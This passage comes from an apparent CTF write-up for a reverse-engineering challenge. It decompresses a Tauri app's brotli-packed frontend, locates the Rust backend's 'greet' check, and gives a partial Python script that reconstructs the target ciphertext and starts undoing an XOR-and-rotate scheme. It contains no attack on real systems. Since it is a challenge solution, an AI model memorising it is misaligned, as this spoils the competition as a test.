</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>brotli</span><span class=o>.</span><span class=n>error</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>decompressed</span> <span class=o>=</span> <span class=n>try_decompress</span><span class=p>(</span><span class=n>content</span><span class=p>[:</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>decompressed</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>decompressed</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>open</span><span class=p>(</span><span class=n>output_file_path</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>decompressed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Decompressed content written to </span><span class=si>{</span><span class=n>output_file_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Failed to decompress the content.&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>解压缩后看index</p><p><img src=https://su-team.cn/img/2025-L3HCTF/cf40c0f2-9dc4-4485-8502-4a4f93873567.png alt=img></p><p>没啥东西，单纯就一加载js</p><p><img src=https://su-team.cn/img/2025-L3HCTF/721c13ef-3482-4f76-8952-e88da3af6942.png alt=img></p><p>js和这个rust后端交互，后端的接口是greet，并且前端未作加密，我们可以直接逆后端。</p><p>那既然知道了greet就直接搜索greet就可</p><p><img src=https://su-team.cn/img/2025-L3HCTF/f8b016e5-af45-4709-afb9-0e7f58f07253.png alt=img></p><p><img src=https://su-team.cn/img/2025-L3HCTF/d02f74b8-7ad3-4ee5-9c32-6eda99684bb9.png alt=img></p><p>逻辑清晰明了</p><p>解密代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x6C</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x6B</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xc</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x96</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x5c</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0xe1</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0xe</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0xa</span><span class=p>,</span> <span class=mh>0x2</span><span class=p>,</span> <span class=mh>0xfc</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    根据逆向分析实现的解密函数
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ANON_DATA</span> <span class=o>=</span> <span class=n>xor</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 这是加密后，程序期望看到的正确结果（27字节的密文）</span>
</span></span><span class=line><span class=cl>    <span class=c1># 我们从伪代码中的四次比较中构造出这个目标密文</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># v8[0:8] == 0x0A409663A025150C</span>
</span></span><span class=line><span class=cl>    <span class=n>target_qword1</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=mh>0x0A409663A025150C</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># v8[8:16] == 0x1FE106294065165C</span>
</span></span><span class=line><span class=cl>    <span class=n>target_qword2</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=mh>0x1FE106294065165C</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># v8[16:24] == 0xFC020A4C0E2C7290</span>
</span></span><span class=line><span class=cl>    <span class=n>target_qword3</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=mh>0xFC020A4C0E2C7290</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># v8[19:27] == *(_QWORD *)((char *)v19 + 3)</span>
</span></span><span class=line><span class=cl>    <span class=c1># v19 的内容是 qword3 + &#34;O2*&#34; = 90 72 2C 0E 4C 0A 02 FC 4F 32 2A</span>
</span></span><span class=line><span class=cl>    <span class=c1># v19[3:] 的内容是 0E 4C 0A 02 FC 4F 32 2A</span>
</span></span><span class=line><span class=cl>    <span class=n>target_qword4</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=mh>0x2A324FFC020A4C0E</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 组合成完整的27字节目标密文</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_target</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=mi>27</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_target</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_qword1</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_target</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_qword2</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_target</span><span class=p>[</span><span class=mi>16</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_qword3</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_target</span><span class=p>[</span><span class=mi>19</span><span class=p>:</span><span class=mi>27</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_qword4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 目标密文 (Hex): </span><span class=si>{</span><span class=n>encrypted_target</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ========================== 解密过程 ==========================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>original_bytes</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=mi>27</span><span class=p>)</span>  <span class=c1># 用于存放解密后的结果</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 遍历每一个字节，执行逆向操作</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># --- 1. 重新计算加密时使用的索引和位移量 ---</span>
</span></span><span class=line><span class=cl>        <span class=n>v10</span> <span class=o>=</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>14</span>
</span></span><span class=line><span class=cl>        <span class=n>some_index</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>14</span>
</span></span><span class=line><span class=cl>        <span class=n>shift</span> <span class=o>=</span> <span class=n>ANON_DATA</span><span class=p>[(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>3</span><span class=p>)</span> <span class=o>%</span> <span class=mi>14</span> <span class=o>+</span> <span class=mi>184</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># --- 2. 逆转加密的第3步 (最终异或) ---</span>
</span></span><span class=line><span class=cl>        <span class=n>rolled_v11</span> <span class=o>=</span> <span class=n>encrypted_target</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>ANON_DATA</span><span class=p>[(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>%</span> <span class=mi>14</span> <span class=o>+</span> <span class=mi>184</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># --- 3. 逆转加密的第2步 (循环右移 ROR) ---</span>
